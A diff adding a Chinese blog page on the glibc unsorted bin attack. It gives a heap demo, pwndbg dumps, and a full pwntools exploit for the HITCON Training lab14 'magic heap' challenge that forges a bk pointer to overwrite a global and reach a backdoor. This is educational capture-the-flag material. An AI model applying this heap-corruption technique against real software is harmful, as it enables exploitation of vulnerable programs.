@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        Unsorted Bin Attack - 一筐萝卜
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> 你若盛开，清风自来！ </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar radius">
+            <img src="/img/avatar.jpg">
+        </div>
+        <div class="name">
+            <i>一筐萝卜</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li>
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li>
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li>
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li>
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>SEARCH</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Unsorted-Bin"><span class="toc-text">Unsorted Bin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#原理"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#例子（HITCON-Training-lab14-magic-heap）"><span class="toc-text">例子（HITCON Training lab14 magic heap）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击流程"><span class="toc-text">攻击流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input">
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> 你若盛开，清风自来！ </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        Unsorted Bin Attack
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2019-08-04 20:02:00</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#pwn" title="pwn">pwn</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+
+    </div>
+    <div class="post-content no-indent">
+        <p># </p>
+<h2 id="Unsorted-Bin"><a href="#Unsorted-Bin" class="headerlink" title="Unsorted Bin"></a>Unsorted Bin</h2><p><code>Unsorted Bin</code>可以看作成<code>small bins</code>和<code>large bins</code>的缓存存储区域，<code>Unsorted Bin</code>只有一个链表，并且是双链表，链表中的chunk不排序，所有的chunk在回收时都要先放到<code>Unsorted Bin</code>中，分配时，如果在<code>Unsorted Bin</code>中没有找到合适的chunk，就会把<code>Unsorted Bin</code>中的所有chunk分别分配到所属的bin中，然后在bin中本配合适的chunk，bins数组中的元素<code>bin[1]</code>用于存储<code>Unsorted Bin</code>的chunk链表的表头，<code>Unsorted Bin</code>链表采用的遍历顺序是FIFO</p>
+<blockquote>
+<p>FIFO:先进先出（队列）<br>LIFO:后进先出（栈）</p>
+</blockquote>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>写一个小的demo</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *heap_1,*heap_2,*heap_3,*heap_4,*heap_5,*heap_6,*heap_7;</span><br><span class="line">    heap_1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    heap_2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    heap_3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    heap_4 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    heap_5 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">free</span>(heap_2);</span><br><span class="line">    <span class="built_in">free</span>(heap_4);</span><br><span class="line">    heap_6 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    heap_7 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>动态调试查看它们具体的值（glibc-2.23）<br>首先我们在<code>demo.c:13</code>下断点，此时两个0x80的chunk都进到了<code>Unsorted Bin</code>中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x6020f0 —▸ 0x602030 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x6020f0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure></p>
+<p>由此我来具体看一下<code>Unsorted Bin</code>中每一个chunk中的数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x6020f0 —▸ 0x602030 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x6020f0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; p *(struct malloc_chunk *)0x6020f0</span><br><span class="line">$1 = &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 145, </span><br><span class="line">  fd = 0x602030, </span><br><span class="line">  bk = 0x7ffff7dd1b78 &lt;main_arena+88&gt;, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p *(struct malloc_chunk *)0x602030</span><br><span class="line">$2 = &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 145, </span><br><span class="line">  fd = 0x7ffff7dd1b78 &lt;main_arena+88&gt;, </span><br><span class="line">  bk = 0x6020f0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p *(struct malloc_chunk *)0x7ffff7dd1b78</span><br><span class="line">$3 = &#123;</span><br><span class="line">  prev_size = 6300080, </span><br><span class="line">  size = 0, </span><br><span class="line">  fd = 0x6020f0, </span><br><span class="line">  bk = 0x602030, </span><br><span class="line">  fd_nextsize = 0x7ffff7dd1b88 &lt;main_arena+104&gt;, </span><br><span class="line">  bk_nextsize = 0x7ffff7dd1b88 &lt;main_arena+104&gt;</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>
+<p>图示(有点丑):<br><img src="https://s2.ax1x.com/2019/08/04/e6fBwR.md.png" alt><br>看的出来这是一个循环列表</p>
+<p>当已经在<code>Unsorted Bin</code>中的chunk被malloc分配出去的时候，会执行下面两行代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>
+<p>同样动态调试查看具体的数据，通过分析发现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov [0x7ffff7dd1b78+0x18],0x6020f0</span><br><span class="line">mov [0x6020f0+0x10],0x7ffff7dd1b78</span><br></pre></td></tr></table></figure></p>
+<p>如图所示<br><img src="https://s2.ax1x.com/2019/08/04/e6fR6e.md.png" alt></p>
+<p>在glibc源码中向上查找bck的赋值,找到<code>bck = victim-&gt;bk;</code>，也就是说，victim就是将要分配出去的chunk，bck就是它的BK指针，对比上面我们画的图片，完全符合</p>
+<p>也就是说，当我们可以控制<code>Unsorted Bin</code>中某一个块的时候，就可以伪造一个<code>victim-&gt;bk</code>,就可以将<code>unsorted_chunks (av)</code>，赋值给我们伪造的地址</p>
+<h2 id="例子（HITCON-Training-lab14-magic-heap）"><a href="#例子（HITCON-Training-lab14-magic-heap）" class="headerlink" title="例子（HITCON Training lab14 magic heap）"></a>例子（HITCON Training lab14 magic heap）</h2><p>程序开启了NX和canary保护，菜单题</p>
+<ul>
+<li>create:设置size，malloc（size），</li>
+<li>edit:再次设置size，输入size个字节，这里造成堆溢出</li>
+<li>delete:free掉malloc分配的块</li>
+<li>存在后门，当我们输入选项4869并且magic变量大于4869时，执行<code>system(&quot;cat ./flag&quot;)</code></li>
+</ul>
+<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>首先分配堆块，使其free之后可以进入到<code>Unsorted Bin</code>，然后通过edit上一个chunk来溢出伪造<code>Unsorted Bin</code>里的块，再将<code>Unsorted Bin</code>里的块给malloc出来（触发漏洞即可修改magic）</p>
+<p>exp：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">r = process(&apos;./magicheap&apos;)</span><br><span class="line">def create_heap(size, content):</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;1&quot;)</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def edit_heap(idx, size, content):</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;2&quot;)</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def del_heap(idx):</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;3&quot;)</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">create_heap(0x20,&quot;123456&quot;)</span><br><span class="line">create_heap(0x80,&quot;456789&quot;)</span><br><span class="line">create_heap(0x20,&quot;789456&quot;)</span><br><span class="line">del_heap(1)</span><br><span class="line"></span><br><span class="line">payload = &quot;a&quot;*0x20+p64(0)+p64(0x91)+p64(0)+p64(0x0000000006020C0-0x10)</span><br><span class="line"></span><br><span class="line">edit_heap(0,0x40,payload)</span><br><span class="line">create_heap(0x80,&quot;123456&quot;)</span><br><span class="line"># gdb.attach(r)</span><br><span class="line"># raw_input()</span><br><span class="line">r.recvuntil(&quot;:&quot;)</span><br><span class="line">r.sendline(&quot;4869&quot;)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>把glibc源码载入到gdb中调试确实很好，数据什么的都可以随时查看，更加帮助理解。</p>
+
+        
+        <br>
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        转发请备注<a href="“https://luobuming.github.io”">一筐萝卜</a>的个人博客 <br>
+        本站总访问量<span id="busuanzi_value_site_pv"></span>次
+       </p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
